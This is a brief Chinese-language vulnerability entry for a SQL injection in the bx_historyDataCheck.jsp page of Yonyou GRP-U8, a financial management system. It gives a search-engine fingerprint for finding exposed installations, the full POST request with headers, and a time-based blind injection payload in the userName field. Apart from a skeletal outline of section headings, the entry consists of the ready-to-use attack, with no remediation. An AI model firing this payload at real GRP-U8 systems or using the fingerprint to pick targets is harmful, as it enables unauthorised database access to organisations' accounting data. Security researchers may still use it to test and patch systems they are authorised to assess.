# 用友GRP-U8bx_historyDataCheck.jspSQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=0A5EC135297A3E84647376F665904405`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 53`

**请求体 / payload**
```
userName=';WAITFOR DELAY '0:0:3'--&ysnd=&historyFlag=

```

**其他**
- 用友GRP-U8 bx\_historyDataCheck.jspSQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8